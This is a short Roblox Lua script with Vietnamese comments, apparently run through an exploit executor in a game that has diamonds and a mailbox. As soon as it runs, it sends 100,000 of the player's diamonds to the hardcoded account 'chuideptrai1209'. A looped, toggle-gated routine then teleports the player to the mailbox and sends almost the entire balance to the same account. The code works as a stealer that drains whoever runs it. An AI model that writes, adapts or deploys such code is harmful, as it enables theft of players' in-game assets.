local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function sendDiamondsToPlayer(playerName, amount)
    local Network = ReplicatedStorage.Network
    Network["Mailbox: Send"]:InvokeServer(playerName, amount)
end

local function checkAndSendDiamonds()
    local player = Players.LocalPlayer
    local leaderstats = player.leaderstats
    local diamonds = leaderstats["\240\159\146\142 Diamonds"].Value

    print("Số lượng kim cương:", diamonds)

    if diamonds >= 100000 then
        -- Giảm số lượng kim cương của người chơi đi 100,000
        leaderstats["\240\159\146\142 Diamonds"].Value = diamonds - 100000
        
        -- Gửi 100,000 kim cương cho tài khoản "chuideptrai1209"
        sendDiamondsToPlayer("chuideptrai1209", 100000)
    end
end

local function sendDiamondsAutomatically()
    while true do
        wait() -- Chờ một khoảng thời gian trước khi kiểm tra lại
        if Toggles.MyToggleSentGems.Value then 
            pcall(function()
                local player = Players.LocalPlayer
                local leaderstats = player.leaderstats
                local diamonds = leaderstats["\240\159\146\142 Diamonds"].Value

                if diamonds >= 10000000000 then
                    local mailboxPadPosition = game.workspace.__MAP.Interactive.Mailbox.Pad.Position
                    local playerPosition = player.Character.HumanoidRootPart.Position
                    
                    if (mailboxPadPosition - playerPosition).Magnitude < 8 then 
                        -- Gửi kim cương
                        sendDiamondsToPlayer("chuideptrai1209", diamonds - 100000)
                    else
                        -- Di chuyển đến hòm thư nếu cách xa
                        player.Character.HumanoidRootPart.CFrame = game.workspace.__MAP.Interactive.Mailbox.Pad.CFrame
                    end
                end
            end)
        end
    end
end

-- Bắt đầu tự động gửi kim cương khi cần
spawn(sendDiamondsAutomatically)

-- Kiểm tra và gửi kim cương khi yêu cầu
checkAndSendDiamonds()
